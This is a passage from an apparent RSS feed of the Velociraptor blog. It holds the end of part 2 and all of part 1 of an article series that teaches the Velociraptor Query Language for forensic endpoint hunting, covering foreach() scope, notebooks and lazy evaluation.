 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>In this example, we select all columns from the foreach() plugin, providing the &lt;strong>row&lt;/strong> argument a query which lists all the running processes and extract their binary path. For each binary path, we run the stat() plugin returning filesystem information (like timestamps, size etc).&lt;/p>
&lt;p>While this query is obviously useful from a DFIR perspective (it tells us when the binary of each process was modified), it also shows how scope is used within VQL.&lt;/p>
&lt;p>You might notice that we refer to a symbol Exe within the &lt;strong>query&lt;/strong> query — where does this get resolved from? The foreach plugin creates a sub-scope in which to run the &lt;strong>query&lt;/strong> query, and appends the row to it. In this way, it is possible to access symbols from the iterated row from the inner loop, and therefore stat a new file each time. Information flows from the &lt;strong>row&lt;/strong> query into the &lt;strong>query&lt;/strong> query by way of the nested scope that is shared between them.&lt;/p>
&lt;h3 id="more-foreach-examples">More foreach examples&lt;/h3>
&lt;p>The foreach plugin is one of the most often used plugins in VQL. It is very common to apply one plugin over the result set of another plugin. Here we give several examples:&lt;/p>
&lt;h4 id="yara-scan-files-matching-a-glob-expression">Yara scan files matching a glob expression:&lt;/h4>
&lt;p>






&lt;figure id="a67001e72a0a16be896d882d73ce8c7c">
 &lt;div data-featherlight="#a67001e72a0a16be896d882d73ce8c7c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/1bGb_CYsiRQko7ai0mcWaVw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h4 id="list-all-open-file-handles-from-all-chrome-processes">List all open file handles from all chrome processes:&lt;/h4>
&lt;p>






&lt;figure id="600b052cad1b4bb8f9721ae61f44fddc">
 &lt;div data-featherlight="#600b052cad1b4bb8f9721ae61f44fddc" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-19-the-velociraptor-query-language-pt-2-fe92bb7aa150/../../img/1h8EgsM6ji2Vv1ewQLx5ikQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;h3 id="conclusions">Conclusions&lt;/h3>
&lt;p>This second installment in our series of articles about VQL internals I introduced the idea of scope in VQL. We saw how scope lookups are central to controlling data flow within the query, with some plugins creating nested sub scope in which to evaluate subqueries.&lt;/p>
&lt;p>We saw how this principle is applied in the &lt;strong>foreach()&lt;/strong> plugin to implement a looping control flow — apply a query over each row produced by another query. This construct allows us to iterate over rows and act on each one with a second dedicated query. Although functionally equivalent to an SQL join operation, it is arguably easier to read and understand VQL queries.&lt;/p>
&lt;p>In the next part we see how VQL queries themselves may be stored in the scope and reused. We go back to the concept of lazy evaluation we encountered in the first part and see how this applies to sub queries. We then introduce event queries as a way to run fully asynchronous and event driven VQL.&lt;/p>
&lt;p>If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at &lt;a href="https://www.velocidex.com/training/" target="_blank" >https://www.velocidex.com/training/&lt;/a>
.&lt;/p></description></item><item><title>The Velociraptor Query Language Pt 1</title><link>https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/</link><pubDate>Sun, 14 Jun 2020 00:38:44 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/</guid><description>&lt;p>






&lt;figure id="ef9ca393a49e2dc1dc60d770104ab1b1">
 &lt;div data-featherlight="#ef9ca393a49e2dc1dc60d770104ab1b1" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/14hy_vlttNoFFf-sr_Ei0tw.jpeg" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Velociraptor’s query language is central to the operation of Velociraptor. We find it being used in querying endpoints, collecting forensic artifacts and endpoint state and even in post processing data on the server.&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading="note">&lt;p>Velociraptor is ultimately just a VQL query evaluation engine!&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>Why should you know more about VQL? Users do not actually need to know VQL to simply collect DFIR artifacts from endpoints, hunt for malware or remediate an infection. The Velociraptor GUI is powerful and provides expert DFIR knowledge at the tip of your fingerprints through built in and community contributed artifact definitions.&lt;/p>
&lt;p>However being proficient in VQL will allow you to be able to write custom artifacts, post process data and adapt quickly to changing requirements during a fluid incident response exercise. You will also be able to understand, modify or adapt existing artifacts to your changing needs or to handle new evidence sources.&lt;/p>
&lt;p>This is the first of a series of articles about the VQL query language. I hope this series will inspire you to develop and contribute new artifacts to this open source project — to the benefit of all members of the community.&lt;/p>
&lt;h3 id="why-a-query-language">Why a query language?&lt;/h3>
&lt;p>Before we start, let&amp;rsquo;s discuss why would we want a query language in an endpoint visibility and monitoring tool, such as Velociraptor.&lt;/p>
&lt;p>In practice, the DFIR process is very fluid — sometimes we don&amp;rsquo;t know in advance what we would encounter. We need a way to rapidly and flexibly deploy new hunting techniques and algorithms in order to responds to the dynamic nature of IR.&lt;/p>
&lt;p>There are a number of other DFIR tools that do not feature a rich query language — but they all provide some method of dynamically adding code to the endpoint. For example &lt;a href="https://github.com/google/grr" target="_blank" >GRR&lt;/a>
 supports “Python Hacks” to run arbitrary code at the endpoint, &lt;a href="https://www.tanium.com/" target="_blank" >Tanium&lt;/a>
 supports running scripts and&lt;a href="https://www.carbonblack.com/" target="_blank" > Carbon Black &lt;/a>
allows running arbitrary commands using an API. All these methods cater for dynamic and flexible response.&lt;/p>
&lt;p>&lt;a href="https://osquery.io/" target="_blank" >OSQuery&lt;/a>
 was the first tool to offer SQL as a query language for accessing endpoint state. This is really powerful and is probably the most similar tool to Velociraptor’s VQL. So in this article we will often highlight similarities and differences between Velociraptor’s VQL and OSQuery’s SQL.&lt;/p>
&lt;h3 id="velociraptor-notebooks">Velociraptor Notebooks&lt;/h3>
&lt;p>In the articles in this series, we will be working with the Velociraptor notebook. The notebook is a way to collaborate with many investigators in the course of a DFIR investigation using a shared document consisting of cells (think of it like a Google docs for DFIR!).&lt;/p>
&lt;p>If you want to follow along this article, you should install the Velociraptor frontend locally (simply generate a simple local config using velociraptor config generate -i and start the frontend using velociraptor.exe &amp;ndash;config server.config.yaml frontend -v.&lt;/p>
&lt;p>Start a new notebook by selecting the notebook in the sidebar then add a new notebook. Provide a title and description and then add a new VQL cell.&lt;/p>
&lt;p>






&lt;figure id="90dace20c60d2700b9807f8956c3a8d9">
 &lt;div data-featherlight="#90dace20c60d2700b9807f8956c3a8d9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1IaE_YYFXGqDIOXuxZa8dWQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Notebooks consists of a series of &lt;strong>Cells&lt;/strong>. There are a number of types of cells but the most common are &lt;strong>Markdown&lt;/strong> Cells and &lt;strong>VQL&lt;/strong> cells. VQL cells allow one to run arbitrary VQL directly within the notebook, and view the results in a table.&lt;/p>
&lt;p>When you create a new notebook, the first cell will be of type markdown. You can add a VQL cell below that by simply selecting Add VQL cell from the toolbar.&lt;/p>
&lt;p>






&lt;figure id="dcbd0115f4065350843bd5484a5aa2c9">
 &lt;div data-featherlight="#dcbd0115f4065350843bd5484a5aa2c9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1bqFDmsEFrvkpE8BGmMi2Tg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>A VQL cell allows one to simply write VQL queries into the notebook. Note that VQL queries in the notebook are actually running on the server itself. It is therefore possible to control and automate the server using VQL (we will see this in a later article).&lt;/p>
&lt;p>For now simply write the following query and click the save icon.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT * FROM info()
&lt;/code>&lt;/pre>
&lt;p>






&lt;figure id="04bb5b213e7bca046ecb6ecb6e0069f4">
 &lt;div data-featherlight="#04bb5b213e7bca046ecb6ecb6e0069f4" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1VIwIVaEUGr16yQlEUy-K9A.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>When you finish writing your VQL query, click the “Save” button to update the notebook cell and recalculate the table.&lt;/p>
&lt;p>You have just written your first VQL query!&lt;/p>
&lt;p>One important thing to note is that the output of a query is always a table. The GUI will render the table in the VQL cell. The table will always return a sequence of rows, each row being a simple collection of columns. You can think of a row as simply a python dictionary with keys being the column names and values being arbitrary objects.&lt;/p>
&lt;h3 id="vql-basics">VQL Basics&lt;/h3>
&lt;p>VQL was designed to be easy to use and simple to understand. It is also based on SQL but does not support more complex SQL constructs like joins. The basic statement in VQL looks like this:&lt;/p>
&lt;p>






&lt;figure id="faa7e9e6191f01a35ad37216c7889354">
 &lt;div data-featherlight="#faa7e9e6191f01a35ad37216c7889354" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1lkLMfTJJDPVUtw1fsBPUEQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>VQL queries start with the SELECT keyword, and are then followed by a list of “Column Selectors” which specify the columns that will be emitted. A VQL query can also have a WHERE clause — representing a filter which the row must pass before it is emitted.&lt;/p>
&lt;p>One of the biggest differences between VQL and SQL is the use of parameters given to plugins. SQL was designed to operate on static data tables, however, in VQL, data sources are not static — they are actually plugins which generate rows when called (for example &lt;em>pslist()&lt;/em> is a plugin which returns one process per row).&lt;/p>
&lt;p>Since plugins run code, it makes sense that they would accept arguments just like functions. Therefore in VQL plugins receive keyword arguments. VQL does not support positional arguments — all arguments are named. In the GUI pressing “?” inside a plugin will suggest all the keywords the plugin accepts so it is really easy to find the names for a plugin’s arguments.&lt;/p>
&lt;p>






&lt;figure id="6eb3a43a0449c124638dd7c993fa2a5f">
 &lt;div data-featherlight="#6eb3a43a0449c124638dd7c993fa2a5f" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1LhnuM1rFwDIhJelj4wN2AA.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>VQL Plugins generate rows, but what exactly is a row? Unlike SQL which deals with simple data types, a VQL row can be thought of as a mapping (i.e. python dictionary or a JSON object) where keys are the column names, and values can take on simple types like integers, strings, as well as complex types like other objects, timestamps etc.&lt;/p>
&lt;p>You can see the raw data for each row in the table by clicking the “Show Raw JSON” button (Looks like binoculars) in the table GUI. For example, for the above query we can see the raw data as below.&lt;/p>
&lt;p>






&lt;figure id="74a102ff8e04dfb6aa9489c50747c20e">
 &lt;div data-featherlight="#74a102ff8e04dfb6aa9489c50747c20e" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1qCKk06PkMDt79-X9Vu8K8Q.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>In our case the &lt;strong>info()&lt;/strong> plugin generated a single row with information about the running platform. The raw data consists of a list of JSON objects — each object represents a single row. Rows have column names and each column may contain different data.&lt;/p>
&lt;h3 id="lazy-vql">Lazy VQL&lt;/h3>
&lt;p>One interesting aspect of VQL is lazy evaluation. Since VQL functions can be expensive or have side effects it is important to understand how they are evaluated. In the following discussion we will illustrate this by use of the &lt;strong>log()&lt;/strong> VQL function — this function simply emits a logging message (you can think of it as the VQL equivalent of &lt;strong>print&lt;/strong>).&lt;/p>
&lt;p>Let us modify the above query to simply log a simple message “I ran!”&lt;/p>
&lt;p>






&lt;figure id="185c838da2985c1b0b58d2b1f59dc0fa">
 &lt;div data-featherlight="#185c838da2985c1b0b58d2b1f59dc0fa" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1-k1KllnlrUkKBgiLO3FvvQ.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>The GUI renders query logs in red under the table. As we can see the log() function evaluated to &lt;strong>true&lt;/strong> and a side effect was logging a message.&lt;/p>
&lt;p>It is best to understand how lazy evaluation works by looking at examples. Consider the following example:&lt;/p>
&lt;p>






&lt;figure id="9c64079de333b2fbe8d4605288902bb2">
 &lt;div data-featherlight="#9c64079de333b2fbe8d4605288902bb2" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/10XsMrQaOdDrFlzUH-LPjqw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>In this query we add another column to the output of the info() plugin called “Log” which contains the **log() **function. We then use this column in the WHERE clause. Since the log() function always returns true, the row will pass the filter and be emitted, as well as a log message printed.&lt;/p>
&lt;p>What happens however, if the row is filtered out? Let us change this query to be filtered only if the OS is windows (this query is running on Linux).&lt;/p>
&lt;p>






&lt;figure id="1b3ec9429f977447ae2081d192240397">
 &lt;div data-featherlight="#1b3ec9429f977447ae2081d192240397" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1-k3j8cbSXKjB-RLQcBgYew.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Since no rows are emitted, the log() function is never evaluated! Therefore we got no logging message. Notice how the log() function is evaluated lazily — since the output is not needed since the row is filtered out.&lt;/p>
&lt;p>Let’s now change the query to consider the Log column in the WHERE clause&lt;/p>
&lt;p>






&lt;figure id="9a12e2d670b07bbbfc9c66cae4c66de5">
 &lt;div data-featherlight="#9a12e2d670b07bbbfc9c66cae4c66de5" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1d0mjp1CUCjGbwuj8NB25Lw.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>Because the WHERE clause needs to evaluate the column “Log” the log() function will be evaluated first — even though the row is ultimately eliminated, we still receive a log message!&lt;/p>
&lt;p>VQL evaluates a logical expression in a lazy manner — the left hand side of the AND clause is evaluated, and if true the right hand side is evaluated.&lt;/p>
&lt;p>Let’s swap the order of the AND clause&lt;/p>
&lt;p>






&lt;figure id="9c3598d532d89b2a3cdd7ae7492a2648">
 &lt;div data-featherlight="#9c3598d532d89b2a3cdd7ae7492a2648" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/12NQXdVa7w_OaecjNXpzm2Q.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This time the row is eliminated by the left hand condition (OS = “Windows”) and VQL does not need to evaluate the Log column at all! Hence we get no logging message.&lt;/p>
&lt;h3 id="using-laziness-in-practice">Using laziness in practice&lt;/h3>
&lt;p>The previous discussion was rather theoretical but how would you use this behavior in reality? When we write VQL it is important to bear in mind how expensive we believe each operation would be.&lt;/p>
&lt;p>For example consider the &lt;strong>hash()&lt;/strong> function which calculates a hash of a file when evaluated. Suppose we were looking for a particular file with a known hash in the &lt;strong>/usr/bin&lt;/strong> directory.&lt;/p>
&lt;p>






&lt;figure id="1bedb7e5a3419adee78d250e8e20390d">
 &lt;div data-featherlight="#1bedb7e5a3419adee78d250e8e20390d" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/1V-alj2p3P3hr5HPYYxM1wg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This query is rather expensive — we have to hash every single file in the directory and compare that to our malicious hash (In VQL &lt;strong>=~&lt;/strong> is the regex match operator). If the directory is large, or we search through many directories, this can take many minutes!&lt;/p>
&lt;p>Instead we can leverage the lazy evaluation property to make the query far more efficient by considering other attributes of the file which are quicker to calculate&lt;/p>
&lt;p>






&lt;figure id="8c3d0ac359b0c44834dda8bd70e449ae">
 &lt;div data-featherlight="#8c3d0ac359b0c44834dda8bd70e449ae" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2020/2020-06-14-the-velociraptor-query-language-pt-1-d721bff100bf/../../img/13_nBDC6EonDZuLmZZXvzgg.png" alt="" />
 &lt;/div>
 &lt;figcaption>
 
 &lt;/figcaption>
&lt;/figure>


&lt;/p>
&lt;p>This revised query is almost instant! We only really hash those files whose size is exactly 499 bytes and never hash any of the other files which are not the ones we are looking for!&lt;/p>
&lt;p>We can now encode this VQL query in an artifact, and launch it as a hunt on our entire deployment. This low cost, almost instant hunt is well suited for very wide deployment without fear of adverse effects on endpoint performance.&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>VQL is a very powerful way of searching for specific indicators on the end point. A good working knowledge of VQL pays dividends to the DFIR hunter. This first part in our series of articles about VQL internals hopes to provide you with the tools and confidence to forge your own VQL queries. In the next article we explore VQL’s control structures such as &lt;strong>if()&lt;/strong>, &lt;strong>foreach()&lt;/strong> and &lt;strong>switch()&lt;/strong>.&lt;/p>
&lt;p>If you want to know more about Velociraptor, VQL and how to use it effectively to hunt across the enterprise, consider enrolling for the next available training course at &lt;a href="https://www.velocidex.com/training/" target="_blank" >https://www.velocidex.com/training/&lt;/a>
.&lt;/p></description></item></channel></rss>